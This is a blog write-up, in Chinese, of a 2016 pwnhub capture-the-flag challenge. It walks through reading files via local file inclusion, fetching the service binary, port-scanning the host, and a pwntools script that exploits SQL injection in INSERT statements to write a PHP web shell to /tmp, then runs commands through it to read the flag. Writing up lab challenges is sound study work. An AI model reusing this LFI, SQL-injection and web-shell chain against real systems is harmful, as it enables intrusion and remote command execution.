---
title: pwnhub_拍卖行
date: 2016-12-18 23:22:00
tags:
- pwnhub
- sqli
- pwn
categories:
- Blogs
---

算是第一次做pwn题，不过有点不得不说，整个题目几乎都是web思路，除了分析bin的部分需要一点儿别的知识，其余都可以web直接做，下面稍微说下吧

<!--more-->

总览整个网站，存在任意文件包含漏洞，但是整个站都是假的，没有任何功能。

`http://54.223.241.254/?page=/etc/passwd`

这里可以读任意文件
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
syslog:x:105:108::/home/syslog:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
ctf:x:1000:1000::/home/ctf:
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
```
但是没有任何收获，我们顺手看看`/proc/self/maps`,没有什么特别的收获，所以目光回到提示
```
 这是pwn题，不用扫。请各位大佬文明驾驶不要搅屎，给大佬递茶。
后端骄傲地采用raft支持, ctf_xinetd部署，独自完成更有趣哦 
```

那么需要既然是ctf_xinetd部署，github搜索一波，找到
`https://github.com/Eadom/ctf_xinetd`

看dockerfile
```
FROM ubuntu:14.04

RUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.list
RUN apt-get update && apt-get -y dist-upgrade
RUN apt-get install -y lib32z1 xinetd

RUN useradd -m ctf

COPY ./bin/ /home/ctf/
COPY ./ctf.xinetd /etc/xinetd.d/ctf
COPY ./start.sh /start.sh

RUN chmod +x /start.sh
RUN chown -R root:ctf /home/ctf
RUN chmod -R 750 /home/ctf
RUN chmod 740 /home/ctf/flag
RUN cp -R /lib* /home/ctf
RUN cp -R /usr/lib* /home/ctf
RUN mkdir /home/ctf/bin
RUN cp /bin/sh /home/ctf/bin
RUN cp /bin/ls /home/ctf/bin
RUN cp /bin/cat /home/ctf/bin

WORKDIR /home/ctf

CMD ["/start.sh"]

EXPOSE 9999
```

找到配置文件
```
service ctf
{
    disable = no
    socket_type = stream
    protocol    = tcp
    wait        = no
    user        = root
    bind        = 0.0.0.0
    server      = /usr/sbin/chroot
    server_args = --userspec=1000:1000 /home/ctf ./raft
    type        = UNLISTED
    port        = 9999
}
```

找到bin

`http://54.223.241.254/?page=/home/ctf/raft`

```
# coding=utf-8

import requests

url = "http://54.223.241.254/?page=/home/ctf/raft"

s = requests.Session()
r = s.get(url)
content = r.content

index = content.find("<!-- SUBSCRIBE SECION -->")
index2 = content.find("<!-- END SUBSCRIBE SECION -->")


f = open("raft","wb+")
f.write(r.content[index+len("<!-- SUBSCRIBE SECION -->")+2:index2])

f.close()
```

拿到bin后配个环境跑跑看
```
root@961e74e128a8:/tmp# ./raft 
==========================================
       Do you want date with Firesun?     
==========================================
Loading....... Succeed!
A date with Firesun is on sale!
```

分析bin主要是这两句
```
INSERT INTO TOKENS (TOKENS, PASSWORD) VALUES('%s', '%s')
INSERT INTO BID (TOKENS, PRICE) VALUES('%s', '%d')
```

关键是PASSWORD和PRICE都是可控值，但是PASSWORD输入为字符串，那么就存在注入，我们只要闭合insert,就可以执行任意语句。

讲道理到这里对于一个webU•ェ•*U就已经很简单了。

但是问题来了，服务端口在哪，苦寻无果，nmap一波

```
root@iZ285ei82c1Z:~# nmap -sT -Pn 54.223.241.254 -p10000-60000

Starting Nmap 6.40 ( http://nmap.org ) at 2016-12-18 16:05 CST
Nmap scan report for ec2-54-223-241-254.cn-north-1.compute.amazonaws.com.cn (54.223.241.254)
Host is up (0.035s latency).
Not shown: 49999 closed ports
PORT      STATE SERVICE
22222/tcp open  unknown
22333/tcp open  unknown

```

找到了22333就是服务端口，然后就很简单了，既然可以注入先翻翻数据库，数据库没东西，那么就写webshell。

这里碰到了nonick搅屎删文件，还强行竞争了一波杀了它的进程

```
from pwn import *
context.log_level = 'debug'

#R = process('./raft')
R = remote('54.223.241.254',22333)

R.recvuntil('A date with Firesun is on sale!\n')
dddd = '2333\');select \'<?php system($_POST["ddog"]) ?>\' into outfile \'/tmp/ddog3\';#'

R.send('bid '+q+'d'*(995-len(dddd))+'\n')
R.send('reg '+'2'*995+'\n')
R.recv()
R.interactive()
```

get flag
```
http://54.223.241.254/?page=/tmp/ddog3

ddog=cat /home/ctf/this-is-real-flag000
```